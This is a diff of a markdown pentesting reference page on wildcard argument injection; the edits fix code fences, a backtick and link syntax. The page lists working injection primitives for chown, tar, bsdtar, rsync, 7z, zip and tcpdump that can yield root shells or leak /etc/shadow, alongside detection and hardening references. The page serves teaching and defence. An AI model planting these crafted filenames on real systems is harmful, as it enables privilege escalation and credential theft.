@@ -1,6 +1,5 @@
 # Wildcards Spare Tricks
 
-
 > Wildcard (aka *glob*) **argument injection** happens when a privileged script runs a Unix binary such as `tar`, `chown`, `rsync`, `zip`, `7z`, … with an unquoted wildcard like `*`.  
 > Since the shell expands the wildcard **before** executing the binary, an attacker who can create files in the working directory can craft filenames that begin with `-` so they are interpreted as **options instead of data**, effectively smuggling arbitrary flags or even commands.  
 > This page collects the most useful primitives, recent research and modern detections for 2023-2025.
@@ -13,14 +12,14 @@ You can **copy the owner/group or the permission bits of an arbitrary file** by 
 # attacker-controlled directory
 touch "--reference=/root/secret``file"   # ← filename becomes an argument
 ```
-```
+
 When root later executes something like:
 
 ```bash
 chown -R alice:alice *.php
 chmod -R 644 *.php
 ```
-```
+
 `--reference=/root/secret``file` is injected, causing *all* matching files to inherit the ownership/permissions of `/root/secret``file`.
 
 *PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).  
@@ -41,7 +40,7 @@ chmod +x shell.sh
 touch "--checkpoint=1"
 touch "--checkpoint-action=exec=sh shell.sh"
 ```
-```
+
 Once root runs e.g. `tar -czf /root/backup.tgz *`, `shell.sh` is executed as root.
 
 ### bsdtar / macOS 14+
@@ -52,7 +51,7 @@ The default `tar` on recent macOS (based on `libarchive`) does *not* implement `
 # macOS example
 touch "--use-compress-program=/bin/sh"
 ```
-```When a privileged script runs `tar -cf backup.tar *`, `/bin/sh` will be started. 
+When a privileged script runs `tar -cf backup.tar *`, `/bin/sh` will be started. 
 
 ---
 
@@ -64,7 +63,7 @@ touch "--use-compress-program=/bin/sh"
 # attacker-controlled directory
 touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
 ```
-```
+
 If root later archives the directory with `rsync -az * backup:/srv/`, the injected flag spawns your shell on the remote side.
 
 *PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).
@@ -81,13 +80,13 @@ cd /path/controlled
 ln -s /etc/shadow   root.txt      # file we want to read
 touch @root.txt                  # tells 7z to use root.txt as file list
 ```
-```
+
 If root executes something like:
 
 ```bash
-7za a /backup/`date +%F.7z -t7z -snl -- *
+7za a /backup/`date +%F`.7z -t7z -snl -- *
 ```
-```
+
 7-Zip will attempt to read `root.txt` (→ `/etc/shadow`) as a file list and will bail out, **printing the contents to stderr**.
 
 ---
@@ -99,7 +98,7 @@ If root executes something like:
 ```bash
 zip result.zip files -T --unzip-command "sh -c id"
 ```
-```
+
 Inject the flag via a crafted filename and wait for the privileged backup script to call `zip -T` (test archive) on the resulting file.
 
 ---
@@ -147,7 +146,7 @@ nc -6 -lvnp 4444 &
 # Then send any packet that matches the BPF to force a rotation
 printf x | nc -u -6 [victim_ipv6] 1234
 ```
-```
+
 Details:
 
 - `-G 1 -W 1` forces an immediate rotate after the first matching packet.
@@ -178,6 +177,6 @@ Hardening tips for vendors:
 
 * Elastic Security – Potential Shell via Wildcard Injection Detected rule (last updated 2025)  
 * Rutger Flohil – “macOS — Tar wildcard injection” (Dec 18 2024)
-* GTFOBins – [[https://gtfobins.github.io/gtfobins/tcpdump/|tcpdump]]
-* FiberGateway GR241AG – [[https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/|Full Exploit Chain]]
+* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
+* FiberGateway GR241AG – [Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
 
